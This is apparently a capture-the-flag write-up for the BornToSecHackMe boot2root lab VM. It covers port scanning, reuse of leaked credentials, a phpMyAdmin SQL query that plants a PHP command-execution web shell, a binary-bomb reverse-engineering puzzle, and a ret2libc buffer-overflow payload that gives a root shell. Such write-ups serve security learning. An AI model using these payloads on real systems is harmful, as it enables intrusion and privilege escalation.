# writeup1

Get the VM IP address
```
$ ifconfig
...
[ip]
...
```

## Analyze IP address

`nmap [ip]/24` : List the ports open on the network and find the ip of BornToSec.

```
$ nmap [ip]/24
...
nmap scan report for [ip]
Host is up (0.00075 latency).
Not shown: 994 closed ports
PORT	STATE	SERVICE
21/tcp	open	ftp
22/tcp	open	ssh
88/tcp	open	http
143/tcp	open	imap
443/tcp	open	https
993/tcp	open	imaps
...
```

`nmap -sV --script=http-enum [ip]` : List files available on the http server.

```
$ nmap -sV --script=http-enum [ip]
...
http-enum:
/forum/: Forum
/phpmyadmin/: phpMyAdmin
/webmail/src/login.php: squirrelmail version 1.4.22
/webmail/images/sm_logo.png: SquirrelMail
...
```

## Backdoor

On `https://[ip]/forum`: \
In `Probleme login` post by lmezard, we found:
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalide user !q\]Ej?*5K5cy*Aj from 161.202.39.38 port 57764 ssh2
```
We use the password `!q\]Ej?*5K5cy*Aj` to connect to lmezard's account and found her email address: `laurie@borntosec.net`\


On `https://[ip]/webmail`:\
Connexion with the same password\
Open mail `DB access`:
```
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
```

On `https://[ip]/phpmyadmin`:\
Connect with :
- user : `root`
- password : `Fg-'kKXBj87E:aJ$`

Creation of a backdoor allowing us to execute shell commands:
```
SELECT 1,  '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/myfile.php'
```
```
https://[ip]/forum/templates_c/myfile.php?cmd=cat%20/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```
These identifiers allows us to connect to ftp using FileZilla and downloads 2 files (README and fun)
```
$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
$ strings fun
...
		printf("Hahahaha Got you!!!\n");
//file632
ft_fun/Y8S1M.pcap
0000640
0001750
0000144
00000000014
12563172202
012523
ustar  
users
//file55
...
$ file fun
fun: POSIX tar archive (GNU)
$ mv fun fun.tar.gz
$ tar -xf fun.tar.gz
$ strings fun.tar.gz | grep printf
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
```
The script is split in several files so we try to reconstruct it:
```
$ bash scripts/get_script.sh
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%  
```

password : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` (in sha-256)

## Laurie

We can connect in ssh with `laurie` using the password.
```
$ ssh laurie@[ip]
$ cat README.md
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!

```

### Diffuse the bomb
- phase 1 : *hint 'P'*

```
$ strings bomb | grep P
PTRh
phase 1 defused. How about the next one?
Public speaking is very easy.
Error: Premature EOF on stdin
```
key 1 = `Public speaking is very easy.`

- phase 2 : *hint ' 2'*
```
$ strings bomb
...
phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Public speaking is very easy.
%d %c %d
giants
Wow! You've defused the secret stage!
...
```
`Ghidra` is a reverse engineering software use to parse code.\
We find that phase 2 corresponds to the 6 first elements of the following sequence:
```
U1 = 1
Un+1 = (n + 1) * Un;
```
key 2 = `1 2 6 24 120 720`

- phase 3 : *hint ' b'*\
syntax : int char int\
using Ghidra we found the following 3 possibilities:
```
1 b 214
2 b 755
7 b 524
```

- phase 4 : *no hint*\
syntax: int \
Using `Ghidra` We found the following sequence:
```
U0 = 1
U1 = 1
Un+2 = Un + Un+1 
```
the key is x for Ux = 55, so x = 9\
key 4 = `9`

- phase 5 : *hint 'o'*\
Using `Ghidra`\
Syntax: array of 6 char \
Decrypt must by `giants`\
Inputs use as index of the string `isrveawhobpnutfg` (& 0xf)\
We need index 15 0 5 11 13 1 so `o`, `p`, `e`, `k`, `M`, `q`\
key 5 = `opekMq`

- phase 6 : *hint '4'*\
Using `Ghidra`\
Syntax: array of 6 int <= 6 \
key 6 = `4 2 6 3 1 5`


### Results
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekMq
4 2 6 3 1 5
```
password : `Publicspeakingisveryeasy.126241207201b2149opekMq426315` \
Warning, use this one (subject error?): `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## Thor
Convert `turtle` file in python and we get a turtle drawing these letters:  `S` `L` `A` `S` `H` \
At the end of the file => `can you diggest this message ?` => A message digest is a cryptographic hash function

password : `646da671ca01bb5d84dbb5fb2238dc8e` (encrypt with MD5)

## Zaz
Using `ghidra`, we have an approximate source code of `exploit_me` :
```
bool main(int param_1,int param_2)
{
	char local_90 [140];
	
	if (1 < param_1) {
		strcpy(local_90,*(char **)(param_2 + 4));
		puts(local_90);
	}
	return param_1 < 2;
}
```

Exploit the buffer overflow to launch a shell as root
```
$ gdb ./exploit_me
(gdb) info proc map
	process 1921
	Mapped address spaces:

		Start Addr   End Addr       Size     Offset objfile
		0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
		0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
		0xb7e2b000 0xb7e2c000     0x1000        0x0 
		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
		0xb7fd2000 0xb7fd5000     0x3000        0x0 
		0xb7fda000 0xb7fdd000     0x3000        0x0 
		0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
		0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
		0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
		0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
		0xbffdf000 0xc0000000    0x21000        0x0 [stack]

(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
	0xb7f8cc58
	1 pattern found.
```
address of `/bin/sh` = `0xb7f8cc58`

```
(gdb) info function system
	All functions matching regular expression "system":

	Non-debugging symbols:
	0xb7e6b060  __libc_system
	0xb7e6b060  system
	0xb7f49550  svcerr_systemerr
```
address of `system` = `0xb7e6b060`


Repeat for `exit`:\
address of `exit` = `0xb7e5ebe0`

now run :

```
$ ./exploit_me $(python -c 'print "a"* 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`�����X���
$ ls
exploit_me  mail
$ whoiam
/bin/sh: 2: whoiam: not found
$ whoami
root
```

The end !
